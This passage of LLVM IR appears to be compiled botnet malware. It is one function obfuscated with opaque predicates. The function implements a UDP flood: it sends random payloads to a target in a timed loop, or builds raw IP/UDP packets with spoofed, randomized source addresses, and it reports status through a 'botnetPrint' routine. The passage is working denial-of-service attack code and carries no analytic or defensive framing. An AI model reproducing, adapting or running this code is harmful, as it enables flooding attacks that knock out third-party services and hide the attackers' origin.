  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #10
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %68

; <label>:51:                                     ; preds = %46
  %52 = load i32, i32* @x.87
  %53 = load i32, i32* @y.88
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %51
  %60 = load i32, i32* @x.87
  %61 = load i32, i32* @y.88
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %559

; <label>:68:                                     ; preds = %46
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %70 = getelementptr inbounds [8 x i8], [8 x i8]* %69, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 8, i32 4, i1 false)
  %71 = load i32, i32* %14, align 4
  store i32 %71, i32* %18, align 4
  %72 = load i32, i32* %12, align 4
  %73 = icmp eq i32 %72, 32
  br i1 %73, label %74, label %203

; <label>:74:                                     ; preds = %68
  %75 = call i32 @socket(i32 2, i32 2, i32 17) #3
  store i32 %75, i32* %19, align 4
  %76 = load i32, i32* %19, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %97, label %78

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* @x.87
  %80 = load i32, i32* @y.88
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i32, i32* @KadenCommStock, align 4
  %88 = call i32 (i32, i8*, ...) @botnetPrint(i32 %87, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  %89 = load i32, i32* @x.87
  %90 = load i32, i32* @y.88
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %559

; <label>:97:                                     ; preds = %74
  %98 = load i32, i32* %13, align 4
  %99 = add nsw i32 %98, 1
  %100 = sext i32 %99 to i64
  %101 = call noalias i8* @malloc(i64 %100) #3
  store i8* %101, i8** %20, align 8
  %102 = load i8*, i8** %20, align 8
  %103 = icmp eq i8* %102, null
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %97
  br label %559

; <label>:105:                                    ; preds = %97
  %106 = load i8*, i8** %20, align 8
  %107 = load i32, i32* %13, align 4
  %108 = add nsw i32 %107, 1
  %109 = sext i32 %108 to i64
  call void @llvm.memset.p0i8.i64(i8* %106, i8 0, i64 %109, i32 1, i1 false)
  %110 = load i8*, i8** %20, align 8
  %111 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %110, i32 %111)
  %112 = call i64 @time(i64* null) #3
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = add nsw i64 %112, %114
  %116 = trunc i64 %115 to i32
  store i32 %116, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %117

; <label>:117:                                    ; preds = %199, %originalBBpart224, %156, %105
  %118 = load i32, i32* %19, align 4
  %119 = load i8*, i8** %20, align 8
  %120 = load i32, i32* %13, align 4
  %121 = sext i32 %120 to i64
  %122 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %123 = call i64 @sendto(i32 %118, i8* %119, i64 %121, i32 0, %struct.sockaddr* %122, i32 16)
  %124 = load i32, i32* %22, align 4
  %125 = load i32, i32* %18, align 4
  %126 = icmp eq i32 %124, %125
  br i1 %126, label %127, label %157

; <label>:127:                                    ; preds = %117
  %128 = load i32, i32* %10, align 4
  %129 = icmp eq i32 %128, 0
  br i1 %129, label %130, label %134

; <label>:130:                                    ; preds = %127
  %131 = call i32 @rand_cmwc()
  %132 = trunc i32 %131 to i16
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %132, i16* %133, align 2
  br label %134

; <label>:134:                                    ; preds = %130, %127
  %135 = load i32, i32* @x.87
  %136 = load i32, i32* @y.88
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %134
  %143 = call i64 @time(i64* null) #3
  %144 = load i32, i32* %21, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp sgt i64 %143, %145
  %147 = load i32, i32* @x.87
  %148 = load i32, i32* @y.88
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %146, label %155, label %156

; <label>:155:                                    ; preds = %originalBBpart28
  br label %202

; <label>:156:                                    ; preds = %originalBBpart28
  store i32 0, i32* %22, align 4
  br label %117

; <label>:157:                                    ; preds = %117
  %158 = load i32, i32* @x.87
  %159 = load i32, i32* @y.88
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %157
  %166 = load i32, i32* %22, align 4
  %167 = add i32 %166, 1
  store i32 %167, i32* %22, align 4
  %168 = load i32, i32* %23, align 4
  %169 = load i32, i32* %15, align 4
  %170 = icmp eq i32 %168, %169
  %171 = load i32, i32* @x.87
  %172 = load i32, i32* @y.88
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart217, label %originalBB10alteredBB

originalBBpart217:                                ; preds = %originalBB10
  br i1 %170, label %179, label %199

; <label>:179:                                    ; preds = %originalBBpart217
  %180 = load i32, i32* @x.87
  %181 = load i32, i32* @y.88
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %179
  %188 = load i32, i32* %16, align 4
  %189 = mul nsw i32 %188, 1000
  %190 = call i32 @usleep(i32 %189)
  store i32 0, i32* %23, align 4
  %191 = load i32, i32* @x.87
  %192 = load i32, i32* @y.88
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart224, label %originalBB19alteredBB

originalBBpart224:                                ; preds = %originalBB19
  br label %117

; <label>:199:                                    ; preds = %originalBBpart217
  %200 = load i32, i32* %23, align 4
  %201 = add i32 %200, 1
  store i32 %201, i32* %23, align 4
  br label %117

; <label>:202:                                    ; preds = %155
  br label %559

; <label>:203:                                    ; preds = %68
  %204 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %204, i32* %24, align 4
  %205 = load i32, i32* %24, align 4
  %206 = icmp ne i32 %205, 0
  br i1 %206, label %226, label %207

; <label>:207:                                    ; preds = %203
  %208 = load i32, i32* @x.87
  %209 = load i32, i32* @y.88
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %207
  %216 = load i32, i32* @KadenCommStock, align 4
  %217 = call i32 (i32, i8*, ...) @botnetPrint(i32 %216, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  %218 = load i32, i32* @x.87
  %219 = load i32, i32* @y.88
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %559

; <label>:226:                                    ; preds = %203
  %227 = load i32, i32* @x.87
  %228 = load i32, i32* @y.88
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %226
  store i32 1, i32* %25, align 4
  %235 = load i32, i32* %24, align 4
  %236 = bitcast i32* %25 to i8*
  %237 = call i32 @setsockopt(i32 %235, i32 0, i32 3, i8* %236, i32 4) #3
  %238 = icmp slt i32 %237, 0
  %239 = load i32, i32* @x.87
  %240 = load i32, i32* @y.88
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %238, label %247, label %266

; <label>:247:                                    ; preds = %originalBBpart232
  %248 = load i32, i32* @x.87
  %249 = load i32, i32* @y.88
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %247
  %256 = load i32, i32* @KadenCommStock, align 4
  %257 = call i32 (i32, i8*, ...) @botnetPrint(i32 %256, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i32 0, i32 0))
  %258 = load i32, i32* @x.87
  %259 = load i32, i32* @y.88
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %559

; <label>:266:                                    ; preds = %originalBBpart232
  store i32 50, i32* %26, align 4
  br label %267

; <label>:267:                                    ; preds = %271, %266
  %268 = load i32, i32* %26, align 4
  %269 = add nsw i32 %268, -1
  store i32 %269, i32* %26, align 4
  %270 = icmp ne i32 %268, 0
  br i1 %270, label %271, label %278

; <label>:271:                                    ; preds = %267
  %272 = call i64 @time(i64* null) #3
  %273 = call i32 @rand_cmwc()
  %274 = zext i32 %273 to i64
  %275 = xor i64 %272, %274
  %276 = trunc i64 %275 to i32
  call void @srand(i32 %276) #3
  %277 = call i32 @rand() #3
  call void @init_rand(i32 %277)
  br label %267

; <label>:278:                                    ; preds = %267
  %279 = load i32, i32* %12, align 4
  %280 = icmp eq i32 %279, 0
  br i1 %280, label %281, label %298

; <label>:281:                                    ; preds = %278
  %282 = load i32, i32* @x.87
  %283 = load i32, i32* @y.88
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %281
  store i32 0, i32* %27, align 4
  %290 = load i32, i32* @x.87
  %291 = load i32, i32* @y.88
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %320

; <label>:298:                                    ; preds = %278
  %299 = load i32, i32* @x.87
  %300 = load i32, i32* @y.88
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %298
  %307 = load i32, i32* %12, align 4
  %308 = sub nsw i32 32, %307
  %309 = shl i32 1, %308
  %310 = sub nsw i32 %309, 1
  %311 = xor i32 %310, -1
  store i32 %311, i32* %27, align 4
  %312 = load i32, i32* @x.87
  %313 = load i32, i32* @y.88
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart282, label %originalBB42alteredBB

originalBBpart282:                                ; preds = %originalBB42
  br label %320

; <label>:320:                                    ; preds = %originalBBpart282, %originalBBpart240
  %321 = load i32, i32* %13, align 4
  %322 = sext i32 %321 to i64
  %323 = add i64 28, %322
  %324 = call i8* @llvm.stacksave()
  store i8* %324, i8** %28, align 8
  %325 = alloca i8, i64 %323, align 16
  %326 = bitcast i8* %325 to %struct.iphdr*
  store %struct.iphdr* %326, %struct.iphdr** %29, align 8
  %327 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %328 = bitcast %struct.iphdr* %327 to i8*
  %329 = getelementptr i8, i8* %328, i64 20
  %330 = bitcast i8* %329 to %struct.udphdr*
  store %struct.udphdr* %330, %struct.udphdr** %30, align 8
  %331 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %332 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %333 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %332, i32 0, i32 0
  %334 = load i32, i32* %333, align 4
  %335 = load i32, i32* %27, align 4
  %336 = call i32 @GRIP(i32 %335)
  %337 = call i32 @htonl(i32 %336) #10
  %338 = load i32, i32* %13, align 4
  %339 = sext i32 %338 to i64
  %340 = add i64 8, %339
  %341 = trunc i64 %340 to i32
  call void @makeIPPacket(%struct.iphdr* %331, i32 %334, i32 %337, i8 zeroext 17, i32 %341)
  %342 = load i32, i32* %13, align 4
  %343 = sext i32 %342 to i64
  %344 = add i64 8, %343
  %345 = trunc i64 %344 to i16
  %346 = call zeroext i16 @htons(i16 zeroext %345) #10
  %347 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 0
  %349 = bitcast %union.anon.1* %348 to %struct.anon.3*
  %350 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %349, i32 0, i32 2
  store i16 %346, i16* %350, align 2
  %351 = call i32 @rand_cmwc()
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 0
  %355 = bitcast %union.anon.1* %354 to %struct.anon.3*
  %356 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %355, i32 0, i32 0
  store i16 %352, i16* %356, align 2
  %357 = load i32, i32* %10, align 4
  %358 = icmp eq i32 %357, 0
  br i1 %358, label %359, label %377

; <label>:359:                                    ; preds = %320
  %360 = load i32, i32* @x.87
  %361 = load i32, i32* @y.88
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %359
  %368 = call i32 @rand_cmwc()
  %369 = load i32, i32* @x.87
  %370 = load i32, i32* @y.88
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %382

; <label>:377:                                    ; preds = %320
  %378 = load i32, i32* %10, align 4
  %379 = trunc i32 %378 to i16
  %380 = call zeroext i16 @htons(i16 zeroext %379) #10
  %381 = zext i16 %380 to i32
  br label %382

; <label>:382:                                    ; preds = %377, %originalBBpart286
  %383 = phi i32 [ %368, %originalBBpart286 ], [ %381, %377 ]
  %384 = load i32, i32* @x.87
  %385 = load i32, i32* @y.88
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %382
  %392 = trunc i32 %383 to i16
  %393 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %394 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %393, i32 0, i32 0
  %395 = bitcast %union.anon.1* %394 to %struct.anon.3*
  %396 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %395, i32 0, i32 1
  store i16 %392, i16* %396, align 2
  %397 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %398 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %397, i32 0, i32 0
  %399 = bitcast %union.anon.1* %398 to %struct.anon.3*
  %400 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %399, i32 0, i32 3
  store i16 0, i16* %400, align 2
  %401 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %402 = bitcast %struct.udphdr* %401 to i8*
  %403 = getelementptr inbounds i8, i8* %402, i64 8
  %404 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %403, i32 %404)
  %405 = bitcast i8* %325 to i16*
  %406 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 2
  %408 = load i16, i16* %407, align 2
  %409 = zext i16 %408 to i32
  %410 = call zeroext i16 @csum(i16* %405, i32 %409)
  %411 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i32 0, i32 7
  store i16 %410, i16* %412, align 2
  %413 = call i64 @time(i64* null) #3
  %414 = load i32, i32* %11, align 4
  %415 = sext i32 %414 to i64
  %416 = add nsw i64 %413, %415
  %417 = trunc i64 %416 to i32
  store i32 %417, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  %418 = load i32, i32* @x.87
  %419 = load i32, i32* @y.88
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart2100, label %originalBB88alteredBB

originalBBpart2100:                               ; preds = %originalBB88
  br label %426

; <label>:426:                                    ; preds = %554, %550, %527, %originalBBpart2100
  br label %427

; <label>:427:                                    ; preds = %426
  %428 = load i32, i32* @x.87
  %429 = load i32, i32* @y.88
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %427
  %436 = load i32, i32* %24, align 4
  %437 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %438 = call i64 @sendto(i32 %436, i8* %325, i64 %323, i32 0, %struct.sockaddr* %437, i32 16)
  %439 = call i32 @rand_cmwc()
  %440 = trunc i32 %439 to i16
  %441 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %442 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %441, i32 0, i32 0
  %443 = bitcast %union.anon.1* %442 to %struct.anon.3*
  %444 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %443, i32 0, i32 0
  store i16 %440, i16* %444, align 2
  %445 = load i32, i32* %10, align 4
  %446 = icmp eq i32 %445, 0
  %447 = load i32, i32* @x.87
  %448 = load i32, i32* @y.88
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %446, label %455, label %473

; <label>:455:                                    ; preds = %originalBBpart2104
  %456 = load i32, i32* @x.87
  %457 = load i32, i32* @y.88
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %455
  %464 = call i32 @rand_cmwc()
  %465 = load i32, i32* @x.87
  %466 = load i32, i32* @y.88
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %478

; <label>:473:                                    ; preds = %originalBBpart2104
  %474 = load i32, i32* %10, align 4
  %475 = trunc i32 %474 to i16
  %476 = call zeroext i16 @htons(i16 zeroext %475) #10
  %477 = zext i16 %476 to i32
  br label %478

; <label>:478:                                    ; preds = %473, %originalBBpart2108
  %479 = phi i32 [ %464, %originalBBpart2108 ], [ %477, %473 ]
  %480 = trunc i32 %479 to i16
  %481 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %482 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %481, i32 0, i32 0
  %483 = bitcast %union.anon.1* %482 to %struct.anon.3*
  %484 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %483, i32 0, i32 1
  store i16 %480, i16* %484, align 2
  %485 = call i32 @rand_cmwc()
  %486 = trunc i32 %485 to i16
  %487 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 3
  store i16 %486, i16* %488, align 4
  %489 = load i32, i32* %27, align 4
  %490 = call i32 @GRIP(i32 %489)
  %491 = call i32 @htonl(i32 %490) #10
  %492 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 8
  store i32 %491, i32* %493, align 4
  %494 = bitcast i8* %325 to i16*
  %495 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 2
  %497 = load i16, i16* %496, align 2
  %498 = zext i16 %497 to i32
  %499 = call zeroext i16 @csum(i16* %494, i32 %498)
  %500 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 7
  store i16 %499, i16* %501, align 2
  %502 = load i32, i32* %32, align 4
  %503 = load i32, i32* %18, align 4
  %504 = icmp eq i32 %502, %503
  br i1 %504, label %505, label %528

; <label>:505:                                    ; preds = %478
  %506 = call i64 @time(i64* null) #3
  %507 = load i32, i32* %31, align 4
  %508 = sext i32 %507 to i64
  %509 = icmp sgt i64 %506, %508
  br i1 %509, label %510, label %527

; <label>:510:                                    ; preds = %505
  %511 = load i32, i32* @x.87
  %512 = load i32, i32* @y.88
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %510
  %519 = load i32, i32* @x.87
  %520 = load i32, i32* @y.88
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %557

; <label>:527:                                    ; preds = %505
  store i32 0, i32* %32, align 4
  br label %426

; <label>:528:                                    ; preds = %478
  %529 = load i32, i32* @x.87
  %530 = load i32, i32* @y.88
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %528
  %537 = load i32, i32* %32, align 4
  %538 = add i32 %537, 1
  store i32 %538, i32* %32, align 4
  %539 = load i32, i32* %33, align 4
  %540 = load i32, i32* %15, align 4
  %541 = icmp eq i32 %539, %540
  %542 = load i32, i32* @x.87
  %543 = load i32, i32* @y.88
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart2124, label %originalBB114alteredBB

originalBBpart2124:                               ; preds = %originalBB114
  br i1 %541, label %550, label %554

; <label>:550:                                    ; preds = %originalBBpart2124
  %551 = load i32, i32* %16, align 4
  %552 = mul nsw i32 %551, 1000
  %553 = call i32 @usleep(i32 %552)
  store i32 0, i32* %33, align 4
  br label %426

; <label>:554:                                    ; preds = %originalBBpart2124
  %555 = load i32, i32* %33, align 4
  %556 = add i32 %555, 1
  store i32 %556, i32* %33, align 4
  br label %426

; <label>:557:                                    ; preds = %originalBBpart2112
  %558 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %558)
  br label %559

; <label>:559:                                    ; preds = %557, %originalBBpart236, %originalBBpart228, %202, %104, %originalBBpart24, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %51
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %560 = load i32, i32* @KadenCommStock, align 4
  %561 = call i32 (i32, i8*, ...) @botnetPrint(i32 %560, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %134
  %562 = call i64 @time(i64* null) #3
  %563 = load i32, i32* %21, align 4
  %564 = sext i32 %563 to i64
  %565 = icmp sgt i64 %562, %564
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %157
  %566 = load i32, i32* %22, align 4
  %_ = shl i32 %566, 1
  %_11 = shl i32 %566, 1
  %_12 = shl i32 %566, 1
  %_13 = sub i32 0, %566
  %gen = add i32 %_13, 1
